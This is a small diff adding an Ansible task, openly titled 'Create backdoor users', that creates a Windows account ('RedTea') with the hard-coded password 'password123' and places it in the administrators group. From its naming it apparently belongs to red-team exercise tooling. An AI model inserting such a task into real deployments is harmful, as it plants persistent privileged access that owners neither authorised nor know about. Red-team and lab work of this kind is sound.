@@ -1,0 +1,13 @@
+#########################################################
+# Create user accounts
+#########################################################
+- name: Create backdoor users
+  win_user:
+    name: '{{ item.user }}'
+    fullname: '{{ item.name }}'
+    password: '{{ item.password }}'
+    state: present
+    groups:
+      - 'administrators'
+  with_items:
+    - { name: 'RedTean', user: 'RedTea', password: 'password123'} 
